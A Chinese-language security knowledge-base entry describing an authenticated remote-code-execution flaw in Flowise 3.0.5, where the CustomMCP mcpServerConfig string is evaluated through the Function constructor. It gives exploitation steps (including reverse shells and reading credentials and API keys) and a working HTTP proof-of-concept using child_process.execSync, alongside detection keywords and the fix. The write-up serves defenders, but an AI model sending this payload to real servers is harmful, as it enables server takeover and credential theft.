---
id: ai-security-agent-security-flowise-custommcp-loadmethod-function-rce
title: Flowise 后台 CustomMCP 节点加载：mcpServerConfig 经 Function('return ...') 求值导致 Node.js 任意代码执行
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: custommcp-config-function-constructor-eval-rce
tags:
- ai-security
- agent-security
- flowise
- llm
- mcp
- nodejs
- rce
- code-injection
- function-constructor
- authenticated
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: 3.0.5（原文复现版本，3.0.6 修复）
verification:
  verified_by: verifier-V227
  verified_at: '2026-11-07T06:55:24+08:00'
  notes: 已对照原文后台RCE章节与 img10-18 核对：Add Nodes→Custom MCP、POST /api/v1/node-load-method/customMCP、loadMethod=listActions→getTools、mcpServerConfig 字符串经 substituteVariablesInString 与 convertToValidJSONString（Function('return '+inputString)()）、IIFE 在 JSON.stringify/parse 前执行、PoC 写 /tmp/RCE.txt、请求携带后台 JWT Cookie、3.0.6 改为 JSON5.parse 均与原文/截图一致。受影响版本按原文标记 3.0.5（原文复现版本，3.0.6 修复），未猜更宽区间；低权限可否调用已标注需实测。未验证点：未复跑 PoC。
url: /docs/ai-security/agent-security/ai-security-agent-security-flowise-custommcp-loadmethod-function-rce/
draft: false
kb_aliases:
- Flowise 后台 RCE
- CustomMCP RCE
- convertToValidJSONString
- node-load-method customMCP
- Function 构造器代码执行
- mcpServerConfig 注入
---

## 一句话结论

Flowise 后台的 `POST /api/v1/node-load-method/customMCP` 在 `loadMethod=listActions` 时把用户提交的 `inputs.mcpServerConfig` 字符串交给 `convertToValidJSONString`，后者用 `Function('return ' + inputString)()` 解析“JSON”；攻击者提交含 IIFE 的对象字面量，即可在服务端 Node.js 进程里执行任意代码，原文 PoC 以容器内 root 身份写入 `/tmp/RCE.txt`。

## 原理

- CustomMCP 节点的 `loadMethods.listActions` 调用 `getTools(nodeData, options)` 来列出 MCP server 提供的工具。
- `getTools` 从 `nodeData.inputs.mcpServerConfig` 取配置。若类型是字符串，先调用 `substituteVariablesInString` 替换 `{{$vars.x}}` 占位符，再调用 `convertToValidJSONString`。
- `convertToValidJSONString` 的实现是 `const jsObject = Function('return ' + inputString)()`，本意是兼容对象字面量语法；但 `Function` 构造器与 `eval` 同级：字符串中的任意表达式（例如 IIFE）会在构造出的函数被调用时立即执行，发生在后面的 `JSON.stringify` 与 `JSON.parse` 之前。
- 因此 payload 不需要是合法 JSON；`({x:(function(){...})()})` 既满足“返回一个对象”的表象，又在求值阶段执行了函数体，`Function` 的作用域是全局作用域，可访问 `process`、`require` 等 Node 内置对象。
- 修复版本 3.0.6 把该函数改为 `JSON5.parse(inputString)`，只解析数据、不再执行 JS。

## 触发条件

- 目标 Flowise 版本受影响（原文复现 3.0.5，3.0.6 修复）。
- 攻击者拥有有效后台会话（原文请求携带登录后的 JWT Cookie，属于后台洞）；普通低权限用户能否调用取决于目标部署的角色权限，需实测。
- `/api/v1/node-load-method/customMCP` 可达，且 `mcpServerConfig` 以字符串传入（前端 Custom MCP 配置正常就是字符串）。
- 无需预先配置或连通 MCP server：代码在解析配置阶段执行，此时尚未建立 MCP 连接。

## 利用步骤

1. 登录 Flowise 后台，取得有效会话 Cookie。
2. 向 `/api/v1/node-load-method/customMCP` 发送 POST：
   - `loadMethod: "listActions"` 触发 `getTools`；
   - `inputs.mcpServerConfig` 为构造的对象字面量字符串。
3. 服务端在 `Function('return ' + inputString)()` 阶段执行 payload；可先执行 `id`/`whoami` 或写文件验证。
4. 用 `process.mainModule.require("child_process").execSync(...)` 或 `require("child_process")` 执行系统命令，具体写法随 Node 版本与模块上下文调整。
5. 进一步可反弹 shell、读取环境变量中的数据库凭证与模型 API Key，或在容器内持久化。

## PoC

原文请求（命令写入 `/tmp/RCE.txt`，仅作结构示例，请勿在未授权环境执行）：

```http
POST /api/v1/node-load-method/customMCP HTTP/1.1
Host: <target>:3000
Content-Type: application/json

{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"echo !!RCE-OK!! >/tmp/RCE.txt\");return 1;})()})"
  }
}
```

原文截图确认 `/tmp/RCE.txt` 内容为 `!!RCE-OK!!`；接口即便返回 “No Available Actions” 之类的错误提示，payload 也已执行。

## 变体与关联

- 同类危险解析：`new Function`、`eval`、`vm.runInNewContext` 被用于“宽松 JSON 解析”时均可在解析阶段执行代码；JSON5 只解析数据，不会执行。
- 关联场景：先通过 CVE-2025-58434 接管管理员账户，再用本漏洞在 Flowise 容器内执行命令，形成“未授权账户接管 → 后台 RCE”链。
- 其他节点加载/配置解析接口若同样信任 `inputs` 字符串并走动态求值，需按相同模式审计。

## 检测与防御

- 升级到 Flowise >= 3.0.6（`convertToValidJSONString` 改为 `JSON5.parse`）。
- 代码审计：全局搜索 `Function(`、`eval(`、`new Function`、`vm.` 在配置解析路径中的使用。
- 检测：`/api/v1/node-load-method/*` 请求体中出现 `function`、`process`、`require`、`child_process`、`exec` 等关键字；Node 进程出现异常 `execSync`/`spawn` 子进程；容器 /tmp 出现可疑文件。
- 加固：节点加载接口只允许已认证且受信角色；对 `mcpServerConfig` 做严格 JSON schema 校验；容器以最小权限运行并限制出网。
